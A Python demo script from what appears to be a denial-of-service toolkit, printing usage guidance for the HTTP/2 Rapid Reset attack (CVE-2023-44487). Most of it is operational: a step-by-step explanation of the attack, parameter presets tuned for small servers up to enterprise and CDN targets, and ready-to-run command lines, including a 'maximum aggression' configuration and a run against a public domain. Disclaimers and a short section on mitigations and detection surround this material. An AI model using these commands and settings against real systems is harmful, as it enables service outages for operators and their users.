#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HTTP/2 Rapid Reset Attack Demo (CVE-2023-44487)
==============================================

Demonstrates the HTTP/2 Rapid Reset attack - one of the most powerful
Layer 7 DoS attacks discovered in 2023.

LEGAL DISCLAIMER:
    This demo is for AUTHORIZED TESTING ONLY in controlled lab environments.
    You MUST have explicit written permission to test any target system.
    
    This attack affected major services including:
    - Cloudflare (mitigated August 2023)
    - Google Cloud (mitigated August 2023)
    - Amazon AWS (mitigated August 2023)
    - Many other CDNs and load balancers

Usage Examples:
    1. Basic HTTP/2 rapid reset (requires HTTPS target with HTTP/2):
       python phantom_storm_v2.py 192.168.1.2 443 50 --attack-type=http2-rapid-reset

    2. Aggressive attack (2000 streams per connection):
       python phantom_storm_v2.py 192.168.1.2 443 100 --attack-type=http2-rapid-reset --h2-streams=2000

    3. With small delay (slightly less aggressive):
       python phantom_storm_v2.py 192.168.1.2 443 50 --attack-type=http2-rapid-reset --h2-streams=1000 --h2-reset-delay=0.001

    4. Check if target supports HTTP/2:
       python -c "from src.core.http2_rapid_reset import H2RapidResetHelper; print(H2RapidResetHelper.check_http2_support('192.168.1.2', 443))"
"""

from src.core.http2_rapid_reset import H2RapidResetHelper
from src.core.attack_types import AttackType

def print_attack_info():
    """Display information about HTTP/2 Rapid Reset attack"""
    
    print("=" * 80)
    print("HTTP/2 RAPID RESET ATTACK - CVE-2023-44487")
    print("=" * 80)
    print()
    print(AttackType.get_description(AttackType.HTTP2_RAPID_RESET))
    print()
    print("How it works:")
    print("  1. Establish HTTP/2 connection via ALPN negotiation")
    print("  2. Send SETTINGS frame to initialize connection")
    print("  3. Rapidly send many HEADERS frames (new streams)")
    print("  4. Immediately send RST_STREAM to cancel each stream")
    print("  5. Server allocates resources but doesn't cleanup fast enough")
    print("  6. Repeat → resource exhaustion → DoS")
    print()
    print("Historical Impact (2023):")
    print("  • Cloudflare: Mitigated record-breaking attacks")
    print("  • Google: Affected multiple services")
    print("  • Amazon AWS: Required emergency patches")
    print("  • Hundreds of services affected worldwide")
    print()
    print("Why so powerful:")
    print("  ✓ Extremely low bandwidth (just frame headers)")
    print("  ✓ Can create 1000s of streams per second")
    print("  ✓ Each stream consumes server resources")
    print("  ✓ Server cleanup is slower than attack speed")
    print("  ✓ Bypasses many traditional rate limits")
    print("  ✓ Hard to detect (looks like legitimate HTTP/2 traffic)")
    print()
    print("Requirements:")
    print("  • Target MUST support HTTP/2 (HTTPS with ALPN)")
    print("  • Target port usually 443 (HTTPS)")
    print("  • Python 3.7+ with SSL support")
    print()
    print("=" * 80)
    print()

def print_parameter_suggestions():
    """Display parameter suggestions for different targets"""
    
    print("=" * 80)
    print("RECOMMENDED PARAMETERS")
    print("=" * 80)
    print()
    
    weak = H2RapidResetHelper.suggest_parameters("weak")
    print(f"Weak Target (small HTTP/2 server):")
    print(f"  Threads            : {weak['threads']}")
    print(f"  Streams/Connection : {weak['streams_per_connection']}")
    print(f"  Reset Delay        : {weak['reset_delay']}s")
    print(f"  Expected Impact    : {weak['estimated_impact']}")
    print()
    
    medium = H2RapidResetHelper.suggest_parameters("medium")
    print(f"Medium Target (typical web server):")
    print(f"  Threads            : {medium['threads']}")
    print(f"  Streams/Connection : {medium['streams_per_connection']}")
    print(f"  Reset Delay        : {medium['reset_delay']}s")
    print(f"  Expected Impact    : {medium['estimated_impact']}")
    print()
    
    strong = H2RapidResetHelper.suggest_parameters("strong")
    print(f"Strong Target (enterprise/CDN):")
    print(f"  Threads            : {strong['threads']}")
    print(f"  Streams/Connection : {strong['streams_per_connection']}")
    print(f"  Reset Delay        : {strong['reset_delay']}s")
    print(f"  Expected Impact    : {strong['estimated_impact']}")
    print()
    
    print("Stream Rate Calculation:")
    print(f"  With 0 delay: ~100,000+ streams/second possible per thread!")
    print(f"  With 100 threads: Up to 10,000,000 streams/second")
    print(f"  This is why the attack is so devastating.")
    print()
    print("=" * 80)
    print()

def print_command_examples():
    """Display example commands"""
    
    print("=" * 80)
    print("COMMAND EXAMPLES")
    print("=" * 80)
    print()
    
    print("Example 1: Check HTTP/2 support first")
    print("  python -c \"from src.core.http2_rapid_reset import H2RapidResetHelper; \\")
    print("    print('HTTP/2 supported:', H2RapidResetHelper.check_http2_support('192.168.1.2', 443))\"")
    print()
    
    print("Example 2: Basic HTTP/2 rapid reset")
    print("  python phantom_storm_v2.py 192.168.1.2 443 50 --attack-type=http2-rapid-reset")
    print()
    
    print("Example 3: Aggressive attack (2000 streams)")
    print("  python phantom_storm_v2.py 192.168.1.2 443 100 \\")
    print("    --attack-type=http2-rapid-reset \\")
    print("    --h2-streams=2000")
    print()
    
    print("Example 4: Maximum aggression (200 threads, 5000 streams)")
    print("  python phantom_storm_v2.py 192.168.1.2 443 200 \\")
    print("    --attack-type=http2-rapid-reset \\")
    print("    --h2-streams=5000 \\")
    print("    --h2-reset-delay=0.0")
    print()
    
    print("Example 5: Slightly less aggressive (with small delay)")
    print("  python phantom_storm_v2.py 192.168.1.2 443 50 \\")
    print("    --attack-type=http2-rapid-reset \\")
    print("    --h2-streams=1000 \\")
    print("    --h2-reset-delay=0.001")
    print()
    
    print("Example 6: Test against public HTTPS site (with authorization!)")
    print("  python phantom_storm_v2.py example.com 443 10 \\")
    print("    --attack-type=http2-rapid-reset \\")
    print("    --h2-streams=100")
    print()
    
    print("=" * 80)
    print()

def print_defense_notes():
    """Display defense and mitigation notes"""
    
    print("=" * 80)
    print("DEFENSE & MITIGATION")
    print("=" * 80)
    print()
    
    print("Server-side mitigations:")
    print("  • Update to latest HTTP/2 implementations")
    print("  • Limit concurrent streams per connection")
    print("  • Rate-limit RST_STREAM frames")
    print("  • Monitor stream creation/cancellation ratio")
    print("  • Implement aggressive connection timeouts")
    print("  • Use WAF with HTTP/2 rapid reset detection")
    print()
    
    print("Patches available:")
    print("  • Nginx: 1.25.2+ (Sep 2023)")
    print("  • Apache: 2.4.58+ (Oct 2023)")
    print("  • Go net/http: v1.21.3+ (Oct 2023)")
    print("  • Node.js: Check CVE-2023-44487 for version")
    print()
    
    print("Detection signs:")
    print("  • Very high stream creation rate")
    print("  • High RST_STREAM frame count")
    print("  • Low data transfer per stream")
    print("  • Rapid connection establishment")
    print()
    
    print("=" * 80)
    print()

def main():
    """Main demo function"""
    
    print()
    print_attack_info()
    print_parameter_suggestions()
    print_command_examples()
    print_defense_notes()
    
    print("⚠️  WARNING - READ CAREFULLY")
    print("=" * 80)
    print("This attack is EXTREMELY POWERFUL and can take down major services.")
    print()
    print("LEGAL REQUIREMENTS:")
    print("  1. ✅ You MUST have WRITTEN PERMISSION from target owner")
    print("  2. ✅ Only test in CONTROLLED LAB ENVIRONMENTS")
    print("  3. ✅ Document your authorization before testing")
    print("  4. ✅ Understand the legal consequences")
    print()
    print("UNAUTHORIZED USE:")
    print("  ❌ Is a FEDERAL CRIME in most countries")
    print("  ❌ Can result in PROSECUTION and IMPRISONMENT")
    print("  ❌ Can cause MASSIVE DAMAGE to production services")
    print("  ❌ Will be DETECTED and TRACED by security teams")
    print()
    print("=" * 80)
    print()
    print("For more information:")
    print("  • CVE-2023-44487: https://nvd.nist.gov/vuln/detail/CVE-2023-44487")
    print("  • docs/ATTACK_METHODS.md - Complete attack documentation")
    print("  • RFC 7540: HTTP/2 Protocol Specification")
    print()

if __name__ == "__main__":
    main()
